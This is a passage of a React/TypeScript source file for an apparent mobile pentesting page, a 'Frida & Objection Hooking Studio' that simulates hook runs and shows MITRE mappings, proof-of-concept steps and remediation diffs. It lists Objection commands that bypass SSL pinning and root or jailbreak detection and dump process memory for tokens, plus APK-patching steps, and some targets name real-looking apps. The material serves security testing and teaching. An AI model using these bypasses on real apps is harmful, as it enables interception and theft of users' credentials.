  { cmd: "android sslpinning disable", desc: "Bypasses all standard Android SSL pinning libraries automatically." },
  { cmd: "android root disable", desc: "Mocks PackageManager and file checks to bypass root detection." },
  { cmd: "android intent launch_activity com.acme.banking.DebugActivity", desc: "Forces unexported Activity launch." },
  { cmd: "ios sslpinning disable", desc: "Bypasses iOS NSURLSession and SecTrust certificate pinning." },
  { cmd: "ios jailbreak disable", desc: "Fakes Cydia file checks to bypass iOS jailbreak detection." },
  { cmd: "memory dump all", desc: "Dumps complete process heap to extract strings and leaked tokens." }
];

export default function FridaStudioPage() {
  const [selectedScript, setSelectedScript] = useState<FridaScript>(PRESET_SCRIPTS[0]);
  const [activeCode, setActiveCode] = useState<string>(PRESET_SCRIPTS[0].code);
  const [selectedTarget, setSelectedTarget] = useState("com.acme.banking");
  const [isRunning, setIsRunning] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [copied, setCopied] = useState(false);
  const [activeTab, setActiveTab] = useState<"frida" | "objection">("frida");
  
  // Right panel sub-tabs
  const [detailTab, setDetailTab] = useState<"terminal" | "ttp" | "poc" | "evidence" | "remediation">("terminal");
  
  const terminalEndRef = useRef<HTMLDivElement>(null);
  const runIntervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (selectedScript) {
      setActiveCode(selectedScript.code || "");
    }
  }, [selectedScript]);

  useEffect(() => {
    try {
      terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
    } catch (e) {}
  }, [logs]);

  useEffect(() => {
    return () => {
      if (runIntervalRef.current) {
        clearInterval(runIntervalRef.current);
      }
    };
  }, []);

  const safeCopy = (text: string, cb?: () => void) => {
    try {
      if (typeof navigator !== "undefined" && navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
          if (cb) cb();
        }).catch(() => {
          fallbackCopy(text, cb);
        });
      } else {
        fallbackCopy(text, cb);
      }
    } catch (e) {
      fallbackCopy(text, cb);
    }
  };

  const fallbackCopy = (text: string, cb?: () => void) => {
    try {
      const ta = document.createElement("textarea");
      ta.value = text;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      if (cb) cb();
    } catch (e) {}
  };

  const handleRun = () => {
    if (runIntervalRef.current) {
      clearInterval(runIntervalRef.current);
    }
    setDetailTab("terminal");
    setIsRunning(true);
    const startMsg = `[*] Connecting to USB Device... Target: ${selectedTarget || "com.acme.banking"}`;
    setLogs([startMsg]);

    const targetLogs = (selectedScript && Array.isArray(selectedScript.mockLogs)) 
      ? [...selectedScript.mockLogs] 
      : [];

    let idx = 0;
    runIntervalRef.current = setInterval(() => {
      if (idx < targetLogs.length) {
        const nextLog = targetLogs[idx];
        if (typeof nextLog === "string") {
          setLogs(prev => [...prev, nextLog]);
        }
        idx++;
      } else {
        if (runIntervalRef.current) clearInterval(runIntervalRef.current);
        setIsRunning(false);
      }
    }, 450);
  };

  const handleStop = () => {
    if (runIntervalRef.current) {
      clearInterval(runIntervalRef.current);
    }
    setIsRunning(false);
    setLogs(prev => [...prev, "[!] [Frida] Script execution detached by user."]);
  };

  const handleCopyCode = () => {
    safeCopy(activeCode, () => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#0a060d] text-white">
      <Navbar />
      <main className="flex-1 pt-20 pb-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
        {/* Header */}
        <div className="mb-6 flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-pink-500/20 pb-6">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold bg-pink-500/10 border border-pink-500/30 text-pink-400 mb-2">
              <Zap className="w-3.5 h-3.5" /> Runtime Instrumentation & Dynamic Hooking
            </div>
            <h1 className="text-3xl font-extrabold tracking-tight">
              Frida &amp; Objection Hooking Studio
            </h1>
            <p className="text-sm text-slate-400 mt-1">
              Interactive Frida script generator, Codeshare catalog, MITRE ATT&amp;CK TTP matrix, Proof of Concept (PoC) chain, and forensic evidence vault.
            </p>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => setActiveTab("frida")}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 ${
                activeTab === "frida" 
                  ? "bg-pink-600 text-white shadow-lg shadow-pink-600/30" 
                  : "bg-slate-900 text-slate-400 border border-slate-800 hover:text-white"
              }`}
            >
              <Cpu className="w-4 h-4" /> Frida Scripts
            </button>
            <button
              onClick={() => setActiveTab("objection")}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 ${
                activeTab === "objection" 
                  ? "bg-pink-600 text-white shadow-lg shadow-pink-600/30" 
                  : "bg-slate-900 text-slate-400 border border-slate-800 hover:text-white"
              }`}
            >
              <Terminal className="w-4 h-4" /> Objection Quick-Patch
            </button>
          </div>
        </div>

        {activeTab === "frida" ? (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Left Column: Script Selector */}
            <div className="lg:col-span-4 space-y-4">
              <div className="bg-[#120b17] border border-slate-800 rounded-2xl p-4">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-2">
                  1. Target Package / Process
                </label>
                <select 
                  value={selectedTarget}
                  onChange={(e) => setSelectedTarget(e.target.value)}
                  className="w-full bg-[#0a060e] border border-slate-700 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-pink-500 font-mono"
                >
                  <option value="com.acme.banking">com.acme.banking (Android APK)</option>
                  <option value="b3nac.injuredandroid">b3nac.injuredandroid (InjuredAndroid CTF)</option>
                  <option value="com.zaxbys.rewards">com.zaxbys.rewards (Bug Bounty App)</option>
                  <option value="com.nike.sport">com.nike.sport (iOS IPA / Jailbreak)</option>
                  <option value="com.acme.shopping">com.acme.shopping (React Native)</option>
                  <option value="com.acme.health">com.acme.health (Flutter)</option>
                </select>
              </div>

              <div className="bg-[#120b17] border border-slate-800 rounded-2xl p-4">
                <div className="flex items-center justify-between mb-3">
                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wider">
                    2. Select Frida Hook Template
                  </label>
                  <span className="text-[10px] text-pink-400 font-mono bg-pink-500/10 px-2 py-0.5 rounded-full">
                    {PRESET_SCRIPTS.length} Available
                  </span>
                </div>

                <div className="space-y-2 max-h-[420px] overflow-y-auto pr-1">
                  {PRESET_SCRIPTS.map((script) => (
                    <button
                      key={script.id}
                      onClick={() => {
                        setSelectedScript(script);
                        if (runIntervalRef.current) clearInterval(runIntervalRef.current);
                        setIsRunning(false);
                      }}
                      className={`w-full text-left p-3 rounded-xl border transition-all ${
                        selectedScript.id === script.id
                          ? "bg-pink-950/30 border-pink-500/60 shadow-md shadow-pink-950/40"
                          : "bg-[#0c0812] border-slate-800/80 hover:border-slate-700"
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                          script.platform === "Android" 
                            ? "bg-emerald-950 text-emerald-400 border border-emerald-800" 
                            : script.platform === "iOS"
                            ? "bg-sky-950 text-sky-400 border border-sky-800"
                            : "bg-purple-950 text-purple-400 border border-purple-800"
                        }`}>
                          {script.platform}
                        </span>
                        <span className="text-[10px] text-slate-500">{script.category}</span>
                      </div>
                      <div className="text-xs font-bold text-white mb-1 line-clamp-1">{script.name}</div>
                      <div className="text-[11px] text-slate-400 line-clamp-2 leading-relaxed">{script.description}</div>
                    </button>
                  ))}
                </div>
              </div>

              {/* CLI Command Cheat */}
              <div className="bg-[#120b17] border border-slate-800 rounded-2xl p-4">
                <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                  <span>Terminal Launch Command</span>
                  <Copy 
                    className="w-3.5 h-3.5 text-slate-500 cursor-pointer hover:text-pink-400" 
                    onClick={() => {
                      safeCopy(`frida -U -f ${selectedTarget} -l ${selectedScript.id}.js --no-pause`);
                    }} 
                  />
                </div>
                <div className="bg-[#060309] border border-slate-800/80 rounded-xl p-2.5 font-mono text-[11px] text-pink-300 break-all">
                  frida -U -f {selectedTarget} -l {selectedScript.id}.js --no-pause
                </div>
              </div>
            </div>

            {/* Right Column: Code Editor + Multi-Tab Detail Section */}
            <div className="lg:col-span-8 space-y-6">
              {/* Code Editor Box */}
              <div className="bg-[#120b17] border border-slate-800 rounded-2xl overflow-hidden shadow-xl">
                <div className="bg-[#180f20] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Code className="w-4 h-4 text-pink-400" />
                    <span className="text-xs font-bold text-white">{selectedScript.name}</span>
                    <span className="text-[10px] text-slate-500 font-mono">({selectedScript.author})</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={handleCopyCode}
                      className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
                    >
                      {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      {copied ? "Copied" : "Copy"}
                    </button>
                    {!isRunning ? (
                      <button
                        onClick={handleRun}
                        className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg text-xs font-bold bg-gradient-to-r from-pink-600 to-rose-600 hover:opacity-90 text-white shadow-lg shadow-pink-600/30 transition-all"
                      >
                        <Play className="w-3.5 h-3.5" /> Run Hook
                      </button>
                    ) : (
                      <button
                        onClick={handleStop}
                        className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg text-xs font-bold bg-rose-600 hover:bg-rose-700 text-white transition-all"
                      >
                        <Square className="w-3.5 h-3.5" /> Stop Hook
                      </button>
                    )}
                  </div>
                </div>

                <div className="p-4 bg-[#07030a]">
                  <textarea
                    value={activeCode}
                    onChange={(e) => setActiveCode(e.target.value)}
                    rows={10}
                    className="w-full bg-transparent font-mono text-xs text-pink-100 focus:outline-none resize-none leading-relaxed selection:bg-pink-600/30"
                    spellCheck={false}
                  />
                </div>
              </div>

              {/* Multi-Tab Detail Section: Terminal | TTP | PoC | Evidence Vault | Remediation */}
              <div className="bg-[#120b17] border border-slate-800 rounded-2xl overflow-hidden shadow-xl">
                {/* Tab Navigation */}
                <div className="bg-[#180f20] px-3 py-2 border-b border-slate-800 flex items-center gap-1 overflow-x-auto">
                  <button
                    onClick={() => setDetailTab("terminal")}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shrink-0 ${
                      detailTab === "terminal"
                        ? "bg-pink-600 text-white shadow-md shadow-pink-600/30"
                        : "text-slate-400 hover:text-white"
                    }`}
                  >
                    <Terminal className="w-3.5 h-3.5" /> Terminal Execution
                  </button>

                  <button
                    onClick={() => setDetailTab("ttp")}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shrink-0 ${
                      detailTab === "ttp"
                        ? "bg-pink-600 text-white shadow-md shadow-pink-600/30"
                        : "text-slate-400 hover:text-white"
                    }`}
                  >
                    <Layers className="w-3.5 h-3.5" /> MITRE ATT&amp;CK TTP
                  </button>

                  <button
                    onClick={() => setDetailTab("poc")}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shrink-0 ${
                      detailTab === "poc"
                        ? "bg-pink-600 text-white shadow-md shadow-pink-600/30"
                        : "text-slate-400 hover:text-white"
                    }`}
                  >
                    <Zap className="w-3.5 h-3.5" /> Proof of Concept (PoC)
                  </button>

                  <button
                    onClick={() => setDetailTab("evidence")}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shrink-0 ${
                      detailTab === "evidence"
                        ? "bg-pink-600 text-white shadow-md shadow-pink-600/30"
                        : "text-slate-400 hover:text-white"
                    }`}
                  >
                    <FileText className="w-3.5 h-3.5" /> Forensic Evidence Vault
                  </button>

                  <button
                    onClick={() => setDetailTab("remediation")}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shrink-0 ${
                      detailTab === "remediation"
                        ? "bg-pink-600 text-white shadow-md shadow-pink-600/30"
                        : "text-slate-400 hover:text-white"
                    }`}
                  >
                    <ShieldCheck className="w-3.5 h-3.5" /> Remediation Diff
                  </button>
                </div>

                {/* Tab 1: Terminal Logs */}
                {detailTab === "terminal" && (
                  <div>
                    <div className="bg-[#140c1a] px-4 py-2 border-b border-slate-800/80 flex items-center justify-between text-xs font-mono text-slate-400">
                      <span className="flex items-center gap-1.5 text-emerald-400">
                        <Terminal className="w-3.5 h-3.5" /> frida-session: {selectedTarget}
                      </span>
                      <button
                        onClick={() => setLogs([])}
                        className="text-slate-500 hover:text-slate-300"
                      >
                        Clear Logs
                      </button>
                    </div>

                    <div className="p-4 bg-[#050207] min-h-[260px] max-h-[340px] overflow-y-auto font-mono text-xs space-y-1.5">
                      {logs && logs.length > 0 ? (
                        logs.map((log, i) => {
                          if (typeof log !== "string") return null;
                          const isSuccess = log.includes("[+]") || log.includes("[✓]");
                          const isError = log.includes("[-]") || log.includes("[!]");
                          const isInfo = log.includes("[*]");
                          return (
                            <div 
                              key={i} 
                              className={`leading-relaxed ${
                                isSuccess
                                  ? "text-emerald-400" 
                                  : isError
                                  ? "text-rose-400"
                                  : isInfo
                                  ? "text-sky-300"
                                  : "text-slate-300"
                              }`}
                            >
                              {log}
                            </div>
                          );
                        })
                      ) : (
                        <div className="text-slate-600 italic">
                          Ready. Click "Run Hook" above to inject script and view real-time runtime method intercepts...
                        </div>
                      )}
                      {isRunning && (
                        <div className="text-pink-400 animate-pulse flex items-center gap-2 mt-2">
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" /> Hook active — listening for method invocations...
                        </div>
                      )}
                      <div ref={terminalEndRef} />
                    </div>
                  </div>
                )}

                {/* Tab 2: MITRE TTP Matrix */}
                {detailTab === "ttp" && (
                  <div className="p-5 space-y-4 bg-[#09040c]">
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div className="bg-[#120b17] border border-slate-800 rounded-xl p-3.5">
                        <div className="text-[10px] text-slate-400 uppercase font-bold">MITRE ATT&amp;CK for Mobile ID</div>
                        <div className="text-sm font-mono font-bold text-pink-400 mt-1">{selectedScript.ttp.mitreId}</div>
                        <div className="text-xs text-slate-300 mt-0.5">{selectedScript.ttp.mitreName}</div>
                      </div>

                      <div className="bg-[#120b17] border border-slate-800 rounded-xl p-3.5">
                        <div className="text-[10px] text-slate-400 uppercase font-bold">ATT&amp;CK Tactic Phase</div>
                        <div className="text-sm font-bold text-amber-400 mt-1">{selectedScript.ttp.tactic}</div>
                        <div className="text-xs text-slate-400 mt-0.5 font-mono">Target: {selectedScript.ttp.targetedSubsystem}</div>
                      </div>
                    </div>

                    <div className="bg-[#120b17] border border-slate-800 rounded-xl p-4 space-y-2">
                      <div className="text-xs font-bold text-slate-300 uppercase flex items-center gap-2">
                        <Flame className="w-4 h-4 text-rose-400" /> Threat Actor Operational Objective (TTP)
                      </div>
                      <p className="text-xs text-slate-300 leading-relaxed">
                        {selectedScript.ttp.threatActorGoal}
                      </p>
                    </div>

                    <div className="bg-[#120b17] border border-slate-800 rounded-xl p-4 space-y-2">
                      <div className="text-xs font-bold text-emerald-400 uppercase flex items-center gap-2">
                        <ShieldCheck className="w-4 h-4" /> Defensive Detection Strategy
                      </div>
                      <p className="text-xs text-slate-300 leading-relaxed">
                        {selectedScript.ttp.detectionMechanism}
                      </p>
                    </div>
                  </div>
                )}

                {/* Tab 3: Proof of Concept (PoC) */}
                {detailTab === "poc" && (
                  <div className="p-5 space-y-5 bg-[#09040c]">
                    <div>
                      <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">
                        1. Attack Prerequisites &amp; Lab Topology
                      </div>
                      <div className="space-y-1.5">
                        {selectedScript.poc.prerequisites.map((req, i) => (
                          <div key={i} className="flex items-center gap-2 text-xs text-slate-300 font-mono bg-[#120b17] px-3 py-2 rounded-lg border border-slate-800">
                            <span className="w-1.5 h-1.5 rounded-full bg-pink-400" />
                            {req}
                          </div>
                        ))}
                      </div>
                    </div>

                    <div>
                      <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">
                        2. Step-by-Step Reproduction Chain
                      </div>
                      <div className="space-y-2.5">
                        {selectedScript.poc.steps.map((st) => (
                          <div key={st.stepNum} className="bg-[#120b17] border border-slate-800 rounded-xl p-3 space-y-1.5">
                            <div className="flex items-center gap-2 text-xs font-bold text-white">
                              <span className="w-5 h-5 rounded-full bg-pink-500/20 text-pink-400 flex items-center justify-center text-[10px]">
                                {st.stepNum}
                              </span>
                              {st.title}
                            </div>
                            {st.cmd && (
                              <div className="bg-[#050207] p-2 rounded text-[11px] font-mono text-emerald-400 border border-slate-800">
                                {st.cmd}
                              </div>
                            )}
                            <div className="text-xs text-slate-400 pl-7">{st.note}</div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Intercepted Raw HTTP / Method Payload */}
                    <div>
                      <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">
                        3. Intercepted Live Payload Capture
                      </div>
                      <div className="bg-[#050207] border border-slate-800 rounded-xl p-4 font-mono text-xs space-y-3">
                        <div className="text-pink-400 font-bold">
                          {selectedScript.poc.interceptedPayload.method} {selectedScript.poc.interceptedPayload.url}
                        </div>
                        <div className="text-slate-400 space-y-0.5 text-[11px] border-b border-slate-800 pb-2">
                          {selectedScript.poc.interceptedPayload.headers.map((h, i) => (
                            <div key={i}>{h}</div>
                          ))}
                        </div>
                        {selectedScript.poc.interceptedPayload.body && (
                          <div className="text-emerald-300 text-[11px] whitespace-pre-wrap bg-[#0c0812] p-2.5 rounded border border-slate-800/80">
                            {selectedScript.poc.interceptedPayload.body}
                          </div>
                        )}
                        <div className="text-amber-300 text-[11px] whitespace-pre-wrap bg-[#100c14] p-2.5 rounded border border-slate-800/80">
                          {selectedScript.poc.interceptedPayload.response}
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* Tab 4: Forensic Evidence Vault */}
                {detailTab === "evidence" && (
                  <div className="p-5 space-y-5 bg-[#09040c]">
                    <div className="flex items-center justify-between bg-pink-950/20 border border-pink-500/30 rounded-xl p-3.5">
                      <div>
                        <div className="text-[10px] text-pink-300 uppercase font-bold">Compliance Standard Test ID</div>
                        <div className="text-sm font-bold text-white mt-0.5">{selectedScript.evidence.masvsMapping}</div>
                      </div>
                      <span className="text-[11px] font-mono text-pink-400 bg-pink-500/10 px-2.5 py-1 rounded-lg border border-pink-500/30">
                        EVIDENCE VERIFIED
                      </span>
                    </div>

                    <div>
                      <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">
                        Recovered High-Value Credentials &amp; Key Material
                      </div>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                        {selectedScript.evidence.extractedSecrets.map((sec, i) => (
                          <div key={i} className="bg-[#120b17] border border-slate-800 rounded-xl p-3">
                            <div className="flex items-center justify-between mb-1">
                              <span className="text-xs font-bold text-slate-300">{sec.key}</span>
                              <span className={`text-[10px] font-bold px-2 py-0.2 rounded ${
                                sec.risk === "Critical" ? "bg-rose-950 text-rose-400 border border-rose-800" : "bg-amber-950 text-amber-400 border border-amber-800"
                              }`}>
                                {sec.risk}
                              </span>
                            </div>
                            <div className="text-xs font-mono text-emerald-400 break-all bg-[#07030a] p-1.5 rounded border border-slate-800/80">
                              {sec.value}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Raw Memory Dump */}
                    <div>
                      <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                        <span>Forensic Process Heap &amp; Protocol Dump</span>
                        <Copy 
                          className="w-3.5 h-3.5 text-slate-500 cursor-pointer hover:text-pink-400" 
                          onClick={() => safeCopy(selectedScript.evidence.forensicDump)} 
                        />
                      </div>
                      <div className="bg-[#050207] border border-slate-800 rounded-xl p-4 font-mono text-xs text-slate-300 whitespace-pre-wrap leading-relaxed max-h-[220px] overflow-y-auto">
                        {selectedScript.evidence.forensicDump}
                      </div>
                    </div>

                    <div className="text-[11px] font-mono text-slate-500 bg-[#07030a] p-2.5 rounded-lg border border-slate-800/80 break-all">
                      🔒 {selectedScript.evidence.sha256Proof}
                    </div>
                  </div>
                )}

                {/* Tab 5: Remediation Code Diff */}
                {detailTab === "remediation" && (
                  <div className="p-5 space-y-4 bg-[#09040c]">
                    <div className="bg-emerald-950/20 border border-emerald-500/30 rounded-xl p-4">
                      <div className="text-xs font-bold text-emerald-400 uppercase mb-1">Architecture Hardening Strategy</div>
                      <p className="text-xs text-slate-300 leading-relaxed">{selectedScript.remediation.guidance}</p>
                    </div>

                    <div className="space-y-3">
                      <div>
                        <div className="text-xs font-bold text-rose-400 uppercase mb-1 flex items-center gap-1.5">
                          <AlertTriangle className="w-3.5 h-3.5" /> Vulnerable Implementation (Before)
                        </div>
                        <div className="bg-[#0f0407] border border-rose-950 rounded-xl p-3.5 font-mono text-xs text-rose-200 whitespace-pre-wrap">
                          {selectedScript.remediation.beforeCode}
                        </div>
                      </div>

                      <div>
                        <div className="text-xs font-bold text-emerald-400 uppercase mb-1 flex items-center gap-1.5">
                          <CheckCircle2 className="w-3.5 h-3.5" /> Hardened Defense Implementation (After)
                        </div>
                        <div className="bg-[#040f09] border border-emerald-950 rounded-xl p-3.5 font-mono text-xs text-emerald-200 whitespace-pre-wrap">
                          {selectedScript.remediation.afterCode}
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        ) : (
          /* Objection Quick-Patch Tab */
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {OBJECTION_COMMANDS.map((obj, i) => (
                <div key={i} className="bg-[#120b17] border border-slate-800 rounded-2xl p-5 hover:border-pink-500/40 transition-all">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs font-mono font-bold text-pink-400 bg-pink-500/10 px-2 py-0.5 rounded">
                      {obj.cmd.split(" ")[0]}
                    </span>
                    <button
                      onClick={() => safeCopy(obj.cmd)}
                      className="p-1.5 text-slate-500 hover:text-white rounded-lg hover:bg-slate-800"
                      title="Copy command"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                  <div className="font-mono text-sm font-bold text-white mb-2">{obj.cmd}</div>
                  <p className="text-xs text-slate-400 leading-relaxed">{obj.desc}</p>
                </div>
              ))}
            </div>

            <div className="bg-[#120b17] border border-slate-800 rounded-2xl p-6">
              <h3 className="text-base font-bold text-white mb-2 flex items-center gap-2">
                <Flame className="w-4 h-4 text-pink-400" /> Automated APK Patching with Objection
              </h3>
              <p className="text-xs text-slate-400 mb-4 leading-relaxed">
                When working with non-rooted physical devices, Objection can unpack the APK, inject the Frida gadget shared library (`libfrida-gadget.so`), patch the `AndroidManifest.xml` network security config, and re-sign with a debug keystore:
              </p>
              <div className="bg-[#07030a] border border-slate-800 rounded-xl p-4 font-mono text-xs text-emerald-400 space-y-2">
                <div># 1. Patch APK with Frida Gadget</div>
                <div className="text-white">objection patchapk --source app-release.apk --architecture arm64-v8a</div>
                <div className="mt-2"># 2. Install patched APK to device</div>
                <div className="text-white">adb install app-release.objection.apk</div>
                <div className="mt-2"># 3. Explore interactively via Objection REPL</div>
                <div className="text-white">objection explore</div>
              </div>
            </div>
          </div>
        )}
      </main>
      <Footer />
    </div>
  );
}
